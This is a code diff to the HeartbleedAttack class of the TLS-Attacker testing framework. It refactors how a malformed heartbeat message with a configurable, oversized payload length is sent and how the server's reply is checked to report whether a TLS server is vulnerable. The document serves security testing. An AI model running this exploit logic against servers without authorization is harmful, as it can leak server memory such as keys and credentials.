@@ -16,6 +16,7 @@ import de.rub.nds.tlsattacker.modifiablevariable.integer.IntegerModificationFact
 import de.rub.nds.tlsattacker.modifiablevariable.integer.ModifiableInteger;
 import de.rub.nds.tlsattacker.modifiablevariable.singlebyte.ModifiableByte;
 import de.rub.nds.tlsattacker.tls.config.ConfigHandler;
+import de.rub.nds.tlsattacker.tls.constants.HandshakeMessageType;
 import de.rub.nds.tlsattacker.tls.protocol.heartbeat.HeartbeatMessage;
 import de.rub.nds.tlsattacker.tls.constants.ProtocolMessageType;
 import de.rub.nds.tlsattacker.tls.exceptions.WorkflowExecutionException;
@@ -31,7 +32,7 @@ import org.apache.logging.log4j.Logger;
 /**
  * Executes the Heartbeat attack against a server and logs an error in case the
  * server responds with a valid heartbeat message.
- *
+ * 
  * @author Juraj Somorovsky (juraj.somorovsky@rub.de)
  */
 public class HeartbleedAttack extends Attacker<HeartbleedCommandConfig> {
@@ -54,8 +55,9 @@ public class HeartbleedAttack extends Attacker<HeartbleedCommandConfig> {
         ModifiableInteger payloadLength = new ModifiableInteger();
         payloadLength.setModification(IntegerModificationFactory.explicitValue(config.getPayloadLength()));
         ModifiableByteArray payload = new ModifiableByteArray();
-        payload.setModification(ByteArrayModificationFactory.explicitValue(new byte[]{1, 3}));
-        HeartbeatMessage hb = (HeartbeatMessage) trace.getFirstProtocolMessage(ProtocolMessageType.HEARTBEAT);
+        payload.setModification(ByteArrayModificationFactory.explicitValue(new byte[] { 1, 3 }));
+        HeartbeatMessage hb = (HeartbeatMessage) trace
+                .getFirstConfiguredSendMessageOfType(ProtocolMessageType.HEARTBEAT);
         hb.setHeartbeatMessageType(heartbeatMessageType);
         hb.setPayload(payload);
         hb.setPayloadLength(payloadLength);
@@ -68,8 +70,12 @@ public class HeartbleedAttack extends Attacker<HeartbleedCommandConfig> {
                     ex);
         }
 
-        if (trace.containsServerFinished()) {
-            ProtocolMessage lastMessage = trace.getLastServerMesssage();
+        if (trace.getActuallyRecievedHandshakeMessagesOfType(HandshakeMessageType.FINISHED).isEmpty()) {
+            LOGGER.log(LogLevel.CONSOLE_OUTPUT,
+                    "Correct TLS handshake cannot be executed, no Server Finished message found. Check the server configuration.");
+        } else {
+            ProtocolMessage lastMessage = trace.getAllActuallyReceivedMessages().get(
+                    trace.getAllActuallyReceivedMessages().size() - 1);
             if (lastMessage.getProtocolMessageType() == ProtocolMessageType.HEARTBEAT) {
                 LOGGER.log(LogLevel.CONSOLE_OUTPUT,
                         "Vulnerable. The server responds with a heartbeat message, although the client heartbeat message contains an invalid ");
@@ -79,9 +85,6 @@ public class HeartbleedAttack extends Attacker<HeartbleedCommandConfig> {
                         "(Most probably) Not vulnerable. The server does not respond with a heartbeat message, it is not vulnerable");
                 vulnerable = false;
             }
-        } else {
-            LOGGER.log(LogLevel.CONSOLE_OUTPUT,
-                    "Correct TLS handshake cannot be executed, no Server Finished message found. Check the server configuration.");
         }
 
         tlsContexts.add(tlsContext);
